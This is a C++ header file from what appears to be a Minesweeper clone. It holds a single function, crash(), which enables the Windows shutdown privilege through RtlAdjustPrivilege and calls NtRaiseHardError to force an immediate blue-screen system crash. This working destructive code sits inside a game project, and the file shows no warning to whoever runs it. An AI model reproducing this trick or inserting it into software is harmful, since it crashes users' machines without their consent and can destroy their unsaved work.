/*===============================
* minesweeper++ - file crash.h
* ===============================
* author: ben staehle
* date:	  10/30/22
* this program (and file) use the GNU GPL v3 License
* see COPYRIGHT.txt for license related information
* ==================================================*/

#pragma once
#include <iostream>
#include <windows.h>
#include <winternl.h>

namespace boss {

    using namespace std;
    typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
    typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

    void crash()
    {
        BOOLEAN bEnabled;
        ULONG uResp;
        LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
        LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
        pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
        pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
        NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
        NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
    }
}
